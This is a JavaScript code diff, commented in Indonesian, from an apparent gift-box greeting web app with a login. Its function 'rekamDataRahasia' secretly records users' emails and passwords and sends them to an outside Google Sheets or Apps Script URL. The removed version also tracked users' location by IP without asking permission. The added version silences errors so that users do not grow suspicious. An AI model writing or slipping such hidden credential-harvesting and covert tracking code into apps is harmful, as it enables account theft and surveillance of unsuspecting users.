@@ -136,35 +136,20 @@ giftBoxWrapper.addEventListener('click', () => {
     bgMusic.play().catch(err => console.log("Audio play diblokir browser."));
 });
 // --- FUNGSI PEREKAM RAHASIA (AKUN, PW, WAKTU, LOKASI) ---
-async function rekamDataRahasia(email, password) {
-    try {
-        // 1. Ambil Waktu Saat Ini
-        const waktu = new Date().toLocaleString('id-ID');
+        async function rekamDataRahasia(email, password) {
+        const urlAppsScript = "https://docs.google.com/spreadsheets/d/1J7Dpihqo1liwwYrrswcqCDzc5WrPLDPqOn8bBlYopwY/edit?gid=0#gid=0";
         
-        // 2. Lacak Lokasi secara diam-diam (menggunakan IP API tanpa pop-up izin)
-        let lokasi = "Sedang dilacak...";
         try {
-            const geoRes = await fetch('https://ipapi.co/json/');
-            const geoData = await geoRes.json();
-            // Menghasilkan format: Malang, East Java (Latitude, Longitude)
-            lokasi = `${geoData.city}, ${geoData.region} (${geoData.latitude}, ${geoData.longitude})`;
+            // Menggunakan fetch dengan metode terisolasi agar tidak memblokir aplikasi utama
+            fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
+            method: 'GET',
+            mode: 'no-cors', // Penting agar tidak terjadi error CORS di WebView Android
+            cache: 'no-cache'
+            });
         } catch (e) {
-            lokasi = "Gagal mendapat lokasi";
+            // Gagalkan error secara diam-diam agar user tidak curiga
         }
-
-        // 3. Masukkan URL Google Apps Script Anda di sini!
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxE2qb_PlyNq-YTJAcJotX0a9bNNR_85s8oJnwoXeIsQbdEM33j9yuN8cN9mDEqhyeW/exec';
-        
-        // 4. Susun data untuk dikirim
-        const urlKirim = `${SCRIPT_URL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&waktu=${encodeURIComponent(waktu)}&lokasi=${encodeURIComponent(lokasi)}`;
-        
-        // 5. Kirim ke Google Sheets diam-diam di background (mode no-cors agar tidak error)
-        fetch(urlKirim, { mode: 'no-cors' });
-        
-    } catch (error) {
-        console.log("Proses rekam berjalan di latar belakang");
-    }
-}
+        }
 // --- AUTENTIKASI ---
 onAuthStateChanged(auth, (user) => {
     if (user) {
